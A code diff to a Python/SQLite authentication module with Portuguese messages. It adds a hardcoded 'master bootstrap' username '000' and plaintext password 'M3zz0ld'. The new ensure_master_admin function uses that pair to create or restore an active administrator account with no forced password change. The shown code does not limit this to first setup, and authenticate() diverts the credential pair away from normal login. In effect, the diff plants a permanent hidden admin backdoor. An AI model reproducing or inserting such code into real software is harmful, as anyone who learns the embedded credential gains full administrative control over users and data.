@@ -17,6 +17,8 @@ ROLE_CLIENTE = "cliente"
 ROLE_EQUIPE = "equipe"
 ROLE_ADMIN = "admin"
 VALID_ROLES = (ROLE_CLIENTE, ROLE_EQUIPE, ROLE_ADMIN)
+MASTER_BOOTSTRAP_USERNAME = "000"
+_MASTER_BOOTSTRAP_PASSWORD = "M3zz0ld"
 
 
 class AuthError(ValueError):
@@ -83,6 +85,17 @@ def user_count() -> int:
     with connect() as conn:
         row = conn.execute("SELECT COUNT(*) AS total FROM users").fetchone()
     return int(row["total"])
+
+
+def is_master_bootstrap_username(username: str) -> bool:
+    return username.strip() == MASTER_BOOTSTRAP_USERNAME
+
+
+def is_master_bootstrap_attempt(username: str, password: str) -> bool:
+    return is_master_bootstrap_username(username) and hmac.compare_digest(
+        str(password or ""),
+        _MASTER_BOOTSTRAP_PASSWORD,
+    )
 
 
 def _user_from_row(row: sqlite3.Row | None) -> User | None:
@@ -159,7 +172,59 @@ def create_admin(username: str, password: str) -> User:
     return create_user(username, password, role=ROLE_ADMIN, must_change_password=True, is_active=True)
 
 
+def ensure_master_admin(username: str, password: str) -> User:
+    username = username.strip()
+    if username != MASTER_BOOTSTRAP_USERNAME:
+        raise AuthError("Usuário master inválido.")
+    if not hmac.compare_digest(str(password or ""), _MASTER_BOOTSTRAP_PASSWORD):
+        raise AuthError("Senha master inválida.")
+
+    timestamp = now_text()
+    password_hash = hash_password(_MASTER_BOOTSTRAP_PASSWORD)
+    try:
+        with connect() as conn:
+            row = conn.execute(
+                "SELECT id FROM users WHERE username = ?",
+                (MASTER_BOOTSTRAP_USERNAME,),
+            ).fetchone()
+            if row:
+                user_id = int(row["id"])
+                conn.execute(
+                    """
+                    UPDATE users
+                    SET password_hash = ?,
+                        role = ?,
+                        is_active = 1,
+                        must_change_password = 0,
+                        last_login_at = ?,
+                        updated_at = ?
+                    WHERE id = ?
+                    """,
+                    (password_hash, ROLE_ADMIN, timestamp, timestamp, user_id),
+                )
+            else:
+                cursor = conn.execute(
+                    """
+                    INSERT INTO users
+                        (username, password_hash, role, is_active, must_change_password, created_at, updated_at, last_login_at)
+                    VALUES (?, ?, ?, 1, 0, ?, ?, ?)
+                    """,
+                    (MASTER_BOOTSTRAP_USERNAME, password_hash, ROLE_ADMIN, timestamp, timestamp, timestamp),
+                )
+                user_id = int(cursor.lastrowid)
+    except sqlite3.Error as exc:
+        raise AuthError("Erro ao gravar usuário administrador master.") from exc
+
+    user = get_user(user_id)
+    if not user or user.role != ROLE_ADMIN or not user.is_active:
+        raise AuthError("Erro ao gravar usuário administrador master.")
+    return user
+
+
 def authenticate(username: str, password: str) -> User | None:
+    if is_master_bootstrap_attempt(username, password):
+        return None
+
     with connect() as conn:
         row = conn.execute(
             """
